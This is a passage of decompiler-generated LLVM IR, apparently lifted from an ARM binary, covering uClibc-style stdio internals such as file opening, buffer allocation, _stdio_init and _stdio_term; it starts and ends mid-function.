.thread4:                                         ; preds = %dec_label_pc_afc8, %bb33
  %v2_afe8 = icmp eq i32 %v0_af74, 0
  store i1 %v2_afe8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_afe8, label %dec_label_pc_aff0, label %dec_label_pc_b01c

dec_label_pc_aff0:                                ; preds = %.thread4
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_aff4 = call i32 @malloc(i32 80)
  store i32 %v1_aff4, i32* %r0.global-to-local, align 4
  store i32 %v1_aff4, i32* @r8, align 4
  %v3_aff8 = icmp eq i32 %v1_aff4, 0
  store i1 %v3_aff8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_aff8, label %dec_label_pc_b21c, label %dec_label_pc_b000

dec_label_pc_b000:                                ; preds = %dec_label_pc_aff0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 32, i32* @r3, align 4
  %v3_b008 = add i32 %v1_aff4, 1
  %v4_b008 = inttoptr i32 %v3_b008 to i8*
  store i8 32, i8* %v4_b008, align 1
  %v0_b00c = load i32, i32* %r2.global-to-local, align 4
  %v1_b00c = load i32, i32* @r8, align 4
  %v2_b00c = add i32 %v1_b00c, 8
  %v3_b00c = inttoptr i32 %v2_b00c to i32*
  store i32 %v0_b00c, i32* %v3_b00c, align 4
  %v0_b010 = load i32, i32* %r2.global-to-local, align 4
  %v1_b010 = trunc i32 %v0_b010 to i8
  %v2_b010 = load i32, i32* @r8, align 4
  %v3_b010 = inttoptr i32 %v2_b010 to i8*
  store i8 %v1_b010, i8* %v3_b010, align 1
  %v0_b014 = load i32, i32* @r8, align 4
  %v1_b014 = add i32 %v0_b014, 56
  store i32 %v1_b014, i32* @r0, align 4
  %v0_b018 = call i32 @__stdio_init_mutex()
  store i32 %v0_b018, i32* %r0.global-to-local, align 4
  %v0_b01c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_b01c

dec_label_pc_b01c:                                ; preds = %.thread4, %dec_label_pc_b000
  %v0_b074 = phi i32 [ %v0_af78, %.thread4 ], [ %v0_b01c.pre, %dec_label_pc_b000 ]
  %v1_b01c = icmp slt i32 %v0_b074, 0
  %v2_b01c = icmp eq i32 %v0_b074, 0
  store i1 %v2_b01c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_b01c, label %dec_label_pc_b074, label %dec_label_pc_b024

dec_label_pc_b024:                                ; preds = %dec_label_pc_b01c
  %v0_b028 = load i32, i32* @r4, align 4
  %v2_b028 = and i32 %v0_b028, ptrtoint (i32* @global_var_20003.420 to i32)
  %v1_b02c = or i32 %v2_b028, 1
  store i32 %v1_b02c, i32* %r2.global-to-local, align 4
  %v0_b030 = load i32, i32* @r6, align 4
  %v1_b030 = add i32 %v0_b030, 1
  %v2_b034 = and i32 %v1_b030, %v1_b02c
  store i32 %v2_b034, i32* %r3.global-to-local, align 4
  %v9_b038 = icmp eq i32 %v2_b034, %v1_b02c
  store i1 %v9_b038, i1* %cpsr_z.global-to-local, align 1
  %v1_b03c = load i32, i32* @r8, align 4
  %v2_b03c = add i32 %v1_b03c, 4
  %v3_b03c = inttoptr i32 %v2_b03c to i32*
  store i32 %v0_b074, i32* %v3_b03c, align 4
  br i1 %v9_b038, label %dec_label_pc_b044, label %dec_label_pc_af98

dec_label_pc_b044:                                ; preds = %dec_label_pc_b024
  %v0_b044 = load i32, i32* @r4, align 4
  %v1_b044 = load i32, i32* @r6, align 4
  %v2_b044 = sub i32 -1, %v1_b044
  %v3_b044 = and i32 %v0_b044, %v2_b044
  store i32 %v3_b044, i32* %r3.global-to-local, align 4
  %v1_b048 = and i32 %v3_b044, 1024
  %v2_b048 = icmp eq i32 %v1_b048, 0
  store i1 %v2_b048, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b048, label %dec_label_pc_b068, label %dec_label_pc_b050

dec_label_pc_b050:                                ; preds = %dec_label_pc_b044
  %v0_b050 = load i32, i32* @r5, align 4
  store i32 %v0_b050, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_b05c = call i32 @__libc_fcntl(i32 %v0_b050, i32 4)
  store i32 %v2_b05c, i32* %r0.global-to-local, align 4
  %v2_b060 = icmp eq i32 %v2_b05c, 0
  store i1 %v2_b060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b060, label %dec_label_pc_b050.dec_label_pc_b068_crit_edge, label %dec_label_pc_af98

dec_label_pc_b050.dec_label_pc_b068_crit_edge:    ; preds = %dec_label_pc_b050
  %v0_b068.pre = load i32, i32* @r6, align 4
  %v0_b06c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b068

dec_label_pc_b068:                                ; preds = %dec_label_pc_b050.dec_label_pc_b068_crit_edge, %dec_label_pc_b044
  %v0_b06c = phi i32 [ %v0_b06c.pre, %dec_label_pc_b050.dec_label_pc_b068_crit_edge ], [ %v0_b044, %dec_label_pc_b044 ]
  %v0_b068 = phi i32 [ %v0_b068.pre, %dec_label_pc_b050.dec_label_pc_b068_crit_edge ], [ %v1_b044, %dec_label_pc_b044 ]
  %v1_b068 = and i32 %v0_b068, 131072
  store i32 %v1_b068, i32* %r3.global-to-local, align 4
  %v2_b06c = or i32 %v1_b068, %v0_b06c
  store i32 %v2_b06c, i32* @r4, align 4
  br label %dec_label_pc_b098

dec_label_pc_b074:                                ; preds = %dec_label_pc_b01c
  %v7_b074 = icmp eq i32 %v0_b074, -1
  store i1 %v7_b074, i1* %cpsr_z.global-to-local, align 1
  %v0_b080.pre = load i32, i32* @r4, align 4
  br i1 %v7_b074, label %dec_label_pc_b074._crit_edge, label %bb34

bb34:                                             ; preds = %dec_label_pc_b074
  %v2_b078 = or i32 %v0_b080.pre, ptrtoint (i32* @global_var_20000.421 to i32)
  store i32 %v2_b078, i32* @r4, align 4
  br label %dec_label_pc_b074._crit_edge

dec_label_pc_b074._crit_edge:                     ; preds = %dec_label_pc_b074, %bb34
  %v0_b080 = phi i32 [ %v2_b078, %bb34 ], [ %v0_b080.pre, %dec_label_pc_b074 ]
  %v0_b07c = load i32, i32* @r6, align 4
  store i32 %v0_b07c, i32* %r0.global-to-local, align 4
  store i32 %v0_b080, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_b088 = inttoptr i32 %v0_b07c to i8*
  %v3_b088 = call i32 @__libc_open(i8* %v2_b088, i32 %v0_b080)
  store i32 %v3_b088, i32* %r0.global-to-local, align 4
  %v1_b08c = icmp slt i32 %v3_b088, 0
  %v2_b08c = icmp eq i32 %v3_b088, 0
  store i1 %v2_b08c, i1* %cpsr_z.global-to-local, align 1
  %v1_b090 = load i32, i32* @r8, align 4
  %v2_b090 = add i32 %v1_b090, 4
  %v3_b090 = inttoptr i32 %v2_b090 to i32*
  store i32 %v3_b088, i32* %v3_b090, align 4
  br i1 %v1_b08c, label %dec_label_pc_afac, label %dec_label_pc_b098

dec_label_pc_b098:                                ; preds = %dec_label_pc_b074._crit_edge, %dec_label_pc_b068
  %v0_b098 = load i32, i32* @r8, align 4
  %v1_b098 = inttoptr i32 %v0_b098 to i32*
  %v2_b098 = load i32, i32* %v1_b098, align 4
  %v1_b09c = and i32 %v2_b098, 8192
  store i32 %v1_b09c, i32* %r3.global-to-local, align 4
  %v3_b0a01 = udiv i32 %v1_b09c, 256
  store i32 %v3_b0a01, i32* %r2.global-to-local, align 4
  %v1_b0a4 = trunc i32 %v3_b0a01 to i8
  %v3_b0a4 = add i32 %v0_b098, 1
  %v4_b0a4 = inttoptr i32 %v3_b0a4 to i8*
  store i8 %v1_b0a4, i8* %v4_b0a4, align 1
  %v0_b0a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0a8 = trunc i32 %v0_b0a8 to i8
  %v2_b0a8 = load i32, i32* @r8, align 4
  %v3_b0a8 = inttoptr i32 %v2_b0a8 to i8*
  store i8 %v1_b0a8, i8* %v3_b0a8, align 1
  %v0_b0ac = load i32, i32* @r4, align 4
  %v1_b0ac = and i32 %v0_b0ac, ptrtoint (i32* @global_var_20000.421 to i32)
  store i32 %v1_b0ac, i32* %r1.global-to-local, align 4
  %v2_b0ac = icmp eq i32 %v1_b0ac, 0
  store i1 %v2_b0ac, i1* %cpsr_z.global-to-local, align 1
  %v0_b0b0 = load i32, i32* @r8, align 4
  %v1_b0b0 = add i32 %v0_b0b0, 1
  %v2_b0b0 = inttoptr i32 %v1_b0b0 to i8*
  %v3_b0b0 = load i8, i8* %v2_b0b0, align 1
  %v4_b0b0 = zext i8 %v3_b0b0 to i32
  %v1_b0b4 = inttoptr i32 %v0_b0b0 to i8*
  %v2_b0b4 = load i8, i8* %v1_b0b4, align 1
  %v3_b0b4 = zext i8 %v2_b0b4 to i32
  store i32 %v3_b0b4, i32* %r3.global-to-local, align 4
  br i1 %v2_b0ac, label %bb36, label %bb35

bb35:                                             ; preds = %dec_label_pc_b098
  store i32 32768, i32* %r1.global-to-local, align 4
  br label %bb36

bb36:                                             ; preds = %dec_label_pc_b098, %bb35
  %v0_b0c8 = phi i32 [ 0, %dec_label_pc_b098 ], [ 32768, %bb35 ]
  %v1_b0bc = and i32 %v0_b0ac, 1024
  store i32 %v1_b0bc, i32* %r0.global-to-local, align 4
  %v4_b0c4 = mul nuw nsw i32 %v4_b0b0, 256
  %v5_b0c4 = or i32 %v3_b0b4, %v4_b0c4
  %v2_b0c8 = or i32 %v0_b0c8, %v1_b0bc
  store i32 %v2_b0c8, i32* %r1.global-to-local, align 4
  %v2_b0d0 = or i32 %v5_b0c4, %v2_b0c8
  %v1_b0c0 = mul i32 %v0_b0ac, 16
  %v1_b0cc = and i32 %v1_b0c0, 48
  %v1_b0d4 = add nuw nsw i32 %v1_b0cc, 16
  %v4_b0d8 = xor i32 %v1_b0d4, 48
  %v5_b0d8 = or i32 %v2_b0d0, %v4_b0d8
  store i32 %v5_b0d8, i32* %r3.global-to-local, align 4
  %v3_b0dc19 = udiv i32 %v2_b0d0, 256
  store i32 %v3_b0dc19, i32* %r2.global-to-local, align 4
  %v1_b0e0 = trunc i32 %v3_b0dc19 to i8
  store i8 %v1_b0e0, i8* %v2_b0b0, align 1
  %v0_b0e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0e4 = trunc i32 %v0_b0e4 to i8
  %v2_b0e4 = load i32, i32* @r8, align 4
  %v3_b0e4 = inttoptr i32 %v2_b0e4 to i8*
  store i8 %v1_b0e4, i8* %v3_b0e4, align 1
  %v0_b0e8 = call i32 @__errno_location()
  store i32 %v0_b0e8, i32* %r0.global-to-local, align 4
  %v0_b0ec = load i32, i32* @r8, align 4
  %v1_b0ec = add i32 %v0_b0ec, 1
  %v2_b0ec = inttoptr i32 %v1_b0ec to i8*
  %v3_b0ec = load i8, i8* %v2_b0ec, align 1
  %v4_b0ec = zext i8 %v3_b0ec to i32
  store i32 %v4_b0ec, i32* %r3.global-to-local, align 4
  %v1_b0f0 = inttoptr i32 %v0_b0ec to i8*
  %v2_b0f0 = load i8, i8* %v1_b0f0, align 1
  %v3_b0f0 = zext i8 %v2_b0f0 to i32
  store i32 %v0_b0e8, i32* @r6, align 4
  %v1_b0f8 = add i32 %v0_b0ec, 4
  %v2_b0f8 = inttoptr i32 %v1_b0f8 to i32*
  %v3_b0f8 = load i32, i32* %v2_b0f8, align 4
  store i32 %v3_b0f8, i32* @r0, align 4
  %v4_b0fc = mul nuw nsw i32 %v4_b0ec, 256
  %v5_b0fc = or i32 %v3_b0f0, %v4_b0fc
  store i32 %v5_b0fc, i32* @r4, align 4
  %v1_b100 = inttoptr i32 %v0_b0e8 to i32*
  %v2_b100 = load i32, i32* %v1_b100, align 4
  store i32 %v2_b100, i32* @r5, align 4
  %v1_b104 = call i32 @isatty(i32 %v3_b0f8)
  store i32 %v1_b104, i32* %r0.global-to-local, align 4
  %v0_b108 = load i32, i32* @r4, align 4
  %v4_b108 = mul i32 %v1_b104, 256
  %v5_b108 = or i32 %v0_b108, %v4_b108
  store i32 %v5_b108, i32* @r4, align 4
  %v3_b10c = sdiv i32 %v5_b108, 256
  store i32 %v3_b10c, i32* %r3.global-to-local, align 4
  %v1_b110 = trunc i32 %v3_b10c to i8
  %v2_b110 = load i32, i32* @r8, align 4
  %v3_b110 = add i32 %v2_b110, 1
  %v4_b110 = inttoptr i32 %v3_b110 to i8*
  store i8 %v1_b110, i8* %v4_b110, align 1
  %v0_b114 = load i32, i32* @r4, align 4
  %v1_b114 = trunc i32 %v0_b114 to i8
  %v2_b114 = load i32, i32* @r8, align 4
  %v3_b114 = inttoptr i32 %v2_b114 to i8*
  store i8 %v1_b114, i8* %v3_b114, align 1
  %v0_b118 = load i32, i32* @r5, align 4
  %v1_b118 = load i32, i32* @r6, align 4
  %v2_b118 = inttoptr i32 %v1_b118 to i32*
  store i32 %v0_b118, i32* %v2_b118, align 4
  %v0_b11c = load i32, i32* @r8, align 4
  %v1_b11c = add i32 %v0_b11c, 8
  %v2_b11c = inttoptr i32 %v1_b11c to i32*
  %v3_b11c = load i32, i32* %v2_b11c, align 4
  store i32 %v3_b11c, i32* %r3.global-to-local, align 4
  %v2_b120 = icmp eq i32 %v3_b11c, 0
  store i1 %v2_b120, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b120, label %dec_label_pc_b128, label %bb37

dec_label_pc_b128:                                ; preds = %bb36
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_b12c = call i32 @malloc(i32 4096)
  store i32 %v1_b12c, i32* %r0.global-to-local, align 4
  %v2_b130 = icmp eq i32 %v1_b12c, 0
  store i1 %v2_b130, i1* %cpsr_z.global-to-local, align 1
  %v1_b144.pre = load i32, i32* @r8, align 4
  br i1 %v2_b130, label %.thread7.thread, label %.thread8

.thread7.thread:                                  ; preds = %dec_label_pc_b128
  %v2_b14420 = add i32 %v1_b144.pre, 8
  %v3_b14421 = inttoptr i32 %v2_b14420 to i32*
  store i32 0, i32* %v3_b14421, align 4
  br label %.thread10

.thread8:                                         ; preds = %dec_label_pc_b128
  %v2_b134 = inttoptr i32 %v1_b144.pre to i32*
  %v3_b134 = load i32, i32* %v2_b134, align 4
  %v2_b138 = or i32 %v3_b134, 16384
  store i32 %v2_b138, i32* %r3.global-to-local, align 4
  %v2_b13c = add i32 %v1_b12c, 4096
  store i32 %v2_b13c, i32* %r2.global-to-local, align 4
  %v4_b140 = sdiv i32 %v2_b138, 256
  store i32 %v4_b140, i32* %r1.global-to-local, align 4
  %v2_b144 = add i32 %v1_b144.pre, 8
  %v3_b144 = inttoptr i32 %v2_b144 to i32*
  store i32 %v1_b12c, i32* %v3_b144, align 4
  %v1_b148 = load i32, i32* %r2.global-to-local, align 4
  %v2_b148 = load i32, i32* @r8, align 4
  %v3_b148 = add i32 %v2_b148, 12
  %v4_b148 = inttoptr i32 %v3_b148 to i32*
  store i32 %v1_b148, i32* %v4_b148, align 4
  %v1_b14c = load i32, i32* %r1.global-to-local, align 4
  %v2_b14c = trunc i32 %v1_b14c to i8
  %v3_b14c = load i32, i32* @r8, align 4
  %v4_b14c = add i32 %v3_b14c, 1
  %v5_b14c = inttoptr i32 %v4_b14c to i8*
  store i8 %v2_b14c, i8* %v5_b14c, align 1
  %v0_b150.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b150.pr.pr, label %.thread10, label %.thread9

.thread9:                                         ; preds = %.thread8
  %v1_b150 = load i32, i32* %r3.global-to-local, align 4
  %v2_b150 = trunc i32 %v1_b150 to i8
  %v3_b150 = load i32, i32* @r8, align 4
  %v4_b150 = inttoptr i32 %v3_b150 to i8*
  store i8 %v2_b150, i8* %v4_b150, align 1
  %v0_b154.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b154.pr.pr, label %.thread10, label %bb37

.thread10:                                        ; preds = %.thread7.thread, %.thread8, %.thread9
  %v2_b154 = load i32, i32* @r8, align 4
  %v3_b154 = add i32 %v2_b154, 12
  %v4_b154 = inttoptr i32 %v3_b154 to i32*
  store i32 %v1_b12c, i32* %v4_b154, align 4
  br label %bb37

bb37:                                             ; preds = %bb36, %.thread9, %.thread10
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e4bc.424 to i32), i32* %r3.global-to-local, align 4
  %v2_b160 = load i32, i32* @r8, align 4
  %v3_b160 = add i32 %v2_b160, 2
  %v4_b160 = inttoptr i32 %v3_b160 to i8*
  store i8 0, i8* %v4_b160, align 1
  %v0_b164 = load i32, i32* @r8, align 4
  %v1_b164 = add i32 %v0_b164, 1
  %v2_b164 = inttoptr i32 %v1_b164 to i8*
  %v3_b164 = load i8, i8* %v2_b164, align 1
  %v4_b164 = zext i8 %v3_b164 to i32
  store i32 %v4_b164, i32* %r2.global-to-local, align 4
  %v2_b168 = load i32, i32* @global_var_1e4bc.424, align 4
  store i32 %v2_b168, i32* %r1.global-to-local, align 4
  %v1_b16c = add i32 %v0_b164, 8
  %v2_b16c = inttoptr i32 %v1_b16c to i32*
  %v3_b16c = load i32, i32* %v2_b16c, align 4
  store i32 %v3_b16c, i32* %r3.global-to-local, align 4
  %v1_b170 = and i32 %v4_b164, 32
  %v2_b170 = icmp eq i32 %v1_b170, 0
  store i1 %v2_b170, i1* %cpsr_z.global-to-local, align 1
  %v2_b174 = add i32 %v0_b164, 20
  %v3_b174 = inttoptr i32 %v2_b174 to i32*
  store i32 %v3_b16c, i32* %v3_b174, align 4
  %v0_b178 = load i32, i32* %r0.global-to-local, align 4
  %v1_b178 = load i32, i32* @r8, align 4
  %v2_b178 = add i32 %v1_b178, 44
  %v3_b178 = inttoptr i32 %v2_b178 to i32*
  store i32 %v0_b178, i32* %v3_b178, align 4
  %v0_b17c = load i32, i32* %r1.global-to-local, align 4
  %v1_b17c = load i32, i32* @r8, align 4
  %v2_b17c = add i32 %v1_b17c, 52
  %v3_b17c = inttoptr i32 %v2_b17c to i32*
  store i32 %v0_b17c, i32* %v3_b17c, align 4
  %v0_b180 = load i32, i32* %r3.global-to-local, align 4
  %v1_b180 = load i32, i32* @r8, align 4
  %v2_b180 = add i32 %v1_b180, 24
  %v3_b180 = inttoptr i32 %v2_b180 to i32*
  store i32 %v0_b180, i32* %v3_b180, align 4
  %v0_b184 = load i32, i32* %r3.global-to-local, align 4
  %v1_b184 = load i32, i32* @r8, align 4
  %v2_b184 = add i32 %v1_b184, 28
  %v3_b184 = inttoptr i32 %v2_b184 to i32*
  store i32 %v0_b184, i32* %v3_b184, align 4
  %v0_b188 = load i32, i32* %r3.global-to-local, align 4
  %v1_b188 = load i32, i32* @r8, align 4
  %v2_b188 = add i32 %v1_b188, 16
  %v3_b188 = inttoptr i32 %v2_b188 to i32*
  store i32 %v0_b188, i32* %v3_b188, align 4
  br i1 %v2_b170, label %dec_label_pc_b21c, label %dec_label_pc_b190

dec_label_pc_b190:                                ; preds = %bb37
  %v2_b190 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_b190, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_e55c.405 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e4a4.409 to i32), i32* %r2.global-to-local, align 4
  %v1_b1a8 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1e4a4.409 to i32), i32* %r0.global-to-local, align 4
  %v1_b1b8 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_1e48c.430 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_af6c, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_e55c.405 to i32), i32* %r1.global-to-local, align 4
  %v1_b1cc = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1e48c.430 to i32), i32* %r0.global-to-local, align 4
  %v1_b1d8 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_1e488.433 to i32), i32* %r2.global-to-local, align 4
  %v2_b1e0 = load i32, i32* bitcast (i32** @global_var_1e488.433 to i32*), align 4
  store i32 %v2_b1e0, i32* %r3.global-to-local, align 4
  store i32 %v2_af6c, i32* @r0, align 4
  %v1_b1e8 = load i32, i32* @r8, align 4
  %v2_b1e8 = add i32 %v1_b1e8, 32
  %v3_b1e8 = inttoptr i32 %v2_b1e8 to i32*
  store i32 %v2_b1e0, i32* %v3_b1e8, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_b1f4 = load i32, i32* @r8, align 4
  %v1_b1f4 = load i32, i32* %r2.global-to-local, align 4
  %v2_b1f4 = inttoptr i32 %v1_b1f4 to i32*
  store i32 %v0_b1f4, i32* %v2_b1f4, align 4
  %v1_b1fc = call i32 @__pthread_return_void()
  store i32 %v2_b190, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 45588, i32* @lr, align 4
  %v1_b210 = call i32 @__pthread_return_void()
  store i32 %v1_b210, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b21c

dec_label_pc_b218:                                ; preds = %dec_label_pc_afac, %dec_label_pc_af98, %dec_label_pc_afb8
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_b21c

dec_label_pc_b21c:                                ; preds = %bb37, %dec_label_pc_aff0, %dec_label_pc_b190, %dec_label_pc_b218
  %v0_b21c = load i32, i32* @r8, align 4
  store i32 %v0_b21c, i32* %r0.global-to-local, align 4
  %v2_b224 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_b224, i32* @r4, align 4
  store i32 %v6_af60, i32* @r5, align 4
  store i32 %v9_af60, i32* @r6, align 4
  store i32 %v15_af60, i32* @r8, align 4
  ret i32 %v0_b21c

; uselistorder directives
  uselistorder i32 %v1_b144.pre, { 1, 0, 2 }
  uselistorder i32 %v3_b10c, { 1, 0 }
  uselistorder i32 %v3_b0a01, { 1, 0 }
  uselistorder i32 %v0_b080, { 1, 0 }
  uselistorder i1 %v7_b074, { 1, 0 }
  uselistorder i32 %v1_b044, { 1, 0 }
  uselistorder i32 %v0_b044, { 1, 0 }
  uselistorder i32 %v1_b02c, { 1, 0, 2 }
  uselistorder i32 %v1_afe0, { 1, 0 }
  uselistorder i1 %v7_af8c, { 1, 0 }
  uselistorder i1 %v7_af80, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0, 22, 23 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3, 4, 5, 7, 6, 8, 10, 9, 12, 11, 14, 13, 15, 17, 16, 18, 19 }
  uselistorder label %dec_label_pc_b21c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_b218, { 2, 0, 1 }
  uselistorder label %bb37, { 2, 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %bb36, { 1, 0 }
  uselistorder label %dec_label_pc_b074._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_b01c, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_afc8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_af98, { 1, 2, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_b228:
  %v0_b228 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_b228, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_b228
  %v5_b228 = sdiv i32 %arg2, 16
  %v6_b228 = and i32 %v5_b228, %arg1
  %v5_b22c = sdiv i32 %arg2, 256
  %v6_b22c = and i32 %v6_b228, %v5_b22c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_b228, %bb
  %v7_b22c = phi i32 [ %arg1, %dec_label_pc_b228 ], [ %v6_b22c, %bb ]
  ret i32 %v7_b22c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_b258 = load i32, i32* @r4, align 4
  store i32 %v3_b258, i32* %stack_var_-24, align 4
  %v9_b258 = load i32, i32* @r6, align 4
  %v0_b25c = call i32 @__errno_location()
  store i32 ptrtoint (i8** @global_var_1e4c0.399 to i32), i32* @r4, align 4
  %v3_b264 = load i8, i8* @global_var_1e4c1.436, align 1
  %v4_b264 = zext i8 %v3_b264 to i32
  %v2_b268 = load i8, i8* bitcast (i8** @global_var_1e4c0.399 to i8*), align 4
  %v3_b268 = zext i8 %v2_b268 to i32
  store i32 %v0_b25c, i32* @r7, align 4
  store i32 0, i32* @r0, align 4
  %v4_b274 = mul nuw nsw i32 %v4_b264, 256
  %v5_b274 = or i32 %v3_b268, %v4_b274
  store i32 %v5_b274, i32* @r6, align 4
  %v1_b278 = inttoptr i32 %v0_b25c to i32*
  %v2_b278 = load i32, i32* %v1_b278, align 4
  store i32 %v2_b278, i32* %r8.global-to-local, align 4
  %v1_b27c = call i32 @isatty(i32 0)
  %v1_b280 = sub i32 1, %v1_b27c
  %v0_b284 = load i32, i32* @r6, align 4
  %v4_b284 = mul i32 %v1_b280, 256
  %v5_b284 = xor i32 %v4_b284, %v0_b284
  %v3_b288 = load i8, i8* @global_var_1e511.437, align 1
  %v4_b288 = zext i8 %v3_b288 to i32
  %v3_b28c = load i8, i8* @global_var_1e510.400, align 1
  %v4_b28c = zext i8 %v3_b28c to i32
  %v3_b290 = sdiv i32 %v5_b284, 256
  store i32 1, i32* @r0, align 4
  %v4_b298 = mul nuw nsw i32 %v4_b288, 256
  %v5_b298 = or i32 %v4_b28c, %v4_b298
  store i32 %v5_b298, i32* @r5, align 4
  %v1_b29c = trunc i32 %v3_b290 to i8
  store i8 %v1_b29c, i8* @global_var_1e4c1.436, align 1
  %v1_b2a0 = trunc i32 %v0_b284 to i8
  %v2_b2a0 = load i32, i32* @r4, align 4
  %v3_b2a0 = inttoptr i32 %v2_b2a0 to i8*
  store i8 %v1_b2a0, i8* %v3_b2a0, align 1
  %v1_b2a4 = call i32 @isatty(i32 1)
  %v1_b2a8 = sub i32 1, %v1_b2a4
  %v0_b2ac = load i32, i32* @r5, align 4
  %v4_b2ac = mul i32 %v1_b2a8, 256
  %v5_b2ac = xor i32 %v4_b2ac, %v0_b2ac
  store i32 %v5_b2ac, i32* %r5.global-to-local, align 4
  %v3_b2b0 = sdiv i32 %v5_b2ac, 256
  %v1_b2b4 = trunc i32 %v3_b2b0 to i8
  store i8 %v1_b2b4, i8* @global_var_1e511.437, align 1
  %v0_b2b8 = load i32, i32* %r8.global-to-local, align 4
  %v1_b2b8 = load i32, i32* @r7, align 4
  %v2_b2b8 = inttoptr i32 %v1_b2b8 to i32*
  store i32 %v0_b2b8, i32* %v2_b2b8, align 4
  %v0_b2bc = load i32, i32* %r5.global-to-local, align 4
  %v1_b2bc = trunc i32 %v0_b2bc to i8
  store i8 %v1_b2bc, i8* @global_var_1e510.400, align 1
  %v2_b2c0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_b2c0, i32* @r4, align 4
  store i32 %v9_b258, i32* @r6, align 4
  ret i32 %v1_b2a8

; uselistorder directives
  uselistorder i32 %v1_b2a8, { 1, 0 }
  uselistorder i32 %v0_b284, { 1, 0 }
  uselistorder i8* @global_var_1e510.400, { 1, 0 }
  uselistorder i8* @global_var_1e511.437, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
  uselistorder i8* @global_var_1e4c1.436, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_14334.439 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_b2d0 = call i32 @memcpy()
  %v0_b2d4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_b2d4, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v1_b2d4 = load i32, i32* @r1, align 4
  %v2_b2d4 = load i32, i32* @r4, align 4
  %v3_b2d4 = load i32, i32* @r3, align 4
  %v8_b2d4 = lshr i32 %v2_b2d4, %v3_b2d4
  %v9_b2d4 = and i32 %v8_b2d4, %v1_b2d4
  store i32 %v9_b2d4, i32* @r4, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_b2d0

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_b2d8 = load i32, i32* @r4, align 4
  store i32 %v3_b2d8, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_1e48c.430 to i32), i32* @r0, align 4
  %v0_b2e0 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_1e4a4.409 to i32), i32* @r0, align 4
  %v0_b2e8 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32** @global_var_1e488.433 to i32), i32* %r3.global-to-local, align 4
  %storemerge5 = load i32, i32* bitcast (i32** @global_var_1e488.433 to i32*), align 4
  store i32 %storemerge5, i32* @r4, align 4
  %v1_b3446 = add i32 %storemerge5, 56
  store i32 %v1_b3446, i32* @r5, align 4
  %v2_b3488 = icmp eq i32 %storemerge5, 0
  store i32 %v1_b3446, i32* %r0.global-to-local, align 4
  br i1 %v2_b3488, label %dec_label_pc_b354, label %dec_label_pc_b2f8

dec_label_pc_b2f8:                                ; preds = %entry, %dec_label_pc_b334
  store i32 ptrtoint (i8* @global_var_e55c.405 to i32), i32* %r3.global-to-local, align 4
  store i32 45828, i32* @lr, align 4
  %v1_b300 = call i32 @__pthread_return_0()
